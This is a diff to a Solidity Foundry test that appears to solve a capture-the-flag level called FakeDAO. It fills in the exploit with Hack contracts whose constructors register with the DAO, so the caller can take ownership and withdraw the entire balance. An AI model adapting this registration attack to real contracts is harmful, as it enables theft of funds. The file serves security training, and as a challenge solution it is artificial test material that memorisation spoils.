@@ -15,7 +15,13 @@ contract FakeDAOTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        vm.startBroadcast();
+        for (uint i = 0; i < 10; i++) {
+            new Hack(instance);
+        }
+        instance.register();
+        instance.withdraw();
+        vm.stopBroadcast();
 
         checkSuccess();
     }
@@ -23,5 +29,11 @@ contract FakeDAOTest is BaseTest {
     function checkSuccess() internal view override {
         assertTrue(instance.owner() != owner, "Solution is not solving the level");
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
+    }
+}
+
+contract Hack {
+    constructor(FakeDAO _daoInstance) {
+        _daoInstance.register();
     }
 }
